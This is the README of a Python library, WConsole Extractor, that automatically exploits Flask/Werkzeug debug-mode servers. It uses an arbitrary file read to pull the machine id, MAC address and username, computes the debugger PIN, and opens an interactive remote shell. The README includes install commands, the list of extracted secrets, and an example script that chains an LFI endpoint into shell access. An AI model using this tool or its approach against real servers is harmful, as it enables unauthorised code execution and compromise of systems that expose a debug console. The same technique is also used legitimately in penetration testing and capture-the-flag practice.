<h1 align="center">Welcome to WConsole Extractor 👋</h1>
<p align="center">
  <img alt="Version" src="https://img.shields.io/badge/version-1.0.0-blue.svg?cacheSeconds=2592000" />
  <a href="https://github.com/Ruulian/wconsole_extractor/blob/main/LICENSE" target="_blank">
    <img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-yellow.svg" />
  </a>
  <a href="https://twitter.com/Ruulian_" target="_blank">
    <img alt="Twitter: Ruulian_" src="https://img.shields.io/twitter/follow/Ruulian_.svg?style=social" />
  </a>
</p>

> Wconsole Extractor is a library which allows to automatically exploit a flask debug mode server. You just need to write a file leak function, pass it to the class ``WConsoleExtractor`` constructor and you can access to all the elements related to the debug mode. Moreover, you can call the `shell` function to obtain an interactive shell.

## 🔨 Install

### From PyPi

**Global installation**:

```sh
pip3 install wconsole-extractor
```

**Python virtual environment**:

```sh
python3 -m venv env
source env/bin/activate
pip3 install wconsole-extractor

# Deactivate environment
deactivate
```

### Installation from repository

**Global installation**:

```sh
git clone https://github.com/Ruulian/wconsole_extractor.git
cd wconsole_extractor
pip3 install .
```

**Python virtual environment**:

```sh
git clone https://github.com/Ruulian/wconsole_extractor.git
cd wconsole_extractor
python3 -m venv env
source env/bin/activate
pip3 install .

# Deactivate environment
deactivate
```

## 📚 Documentation

**Note**: The target operating system must be a Linux distribution.

### Prerequisites

In order to use correctly the library, you need to have an arbitrary file read on the target and implement it in python.

You must write a function that takes a filename as parameter and returns the content of the file on the target. If the file is not found, the function should return an **empty string**.

### Available attributes

From `WconsoleExtractor` instance, you can access mutiple attributes:

```py
# Target information
extractor.target               # Specified target
extractor.base_url             # Target base url
extractor.hostname             # hostname

# Versions
extractor.python_version       # Python version
extractor.werkzeug_version     # Werkzeug version

# Probably public bits
extractor.username             # User who launched the application
extractor.flask_path           # Flask installation path
extractor.modname              # Constant "flask.app"
extractor.class_name           # Constant "Flask"
extractor.probably_public_bits # Probably public bits [username, modname, class_name, flask_path]

# Private bits
extractor.machine_id           # Machine id
extractor.uuidnode             # MAC address in decimal
extractor.private_bits         # private bits

# Post process information
extractor.pin_code             # Werkzeug PIN CODE
extractor.token                # Werkzeug console token (available in HTML source code)

# Functions
extractor.shell()              # Get interactive shell
```

### Example

```py
from wconsole_extractor import WConsoleExtractor, info
import requests

def leak_function(filename) -> str:
    r = requests.get(f"http://localhost:5000/lfi?path={filename}")
    if r.status_code == 200:
        return r.text
    else:
        return ""

extractor = WConsoleExtractor(
    target="http://localhost:5000",
    leak_function=leak_function
)


info(f"PIN CODE: {extractor.pin_code}")
extractor.shell()
```

## ✨ Demo

![example_gif](.github/example.gif)

## Author

👤 **Ruulian**

* Website: https://ruulian.me
* Twitter: [@Ruulian_](https://twitter.com/Ruulian_)

## 🤝 Contributing

Contributions, issues and feature requests are welcome!<br />Feel free to check [issues page](https://github.com/Ruulian/wconsole_extractor/issues). 

## Show your support

Give a ⭐️ if this project helped you!

## 📝 License

This project is [MIT](https://github.com/Ruulian/wconsole_extractor/blob/main/LICENSE) licensed.

***
_This README was generated with ❤️ by [readme-md-generator](https://github.com/kefranabg/readme-md-generator)_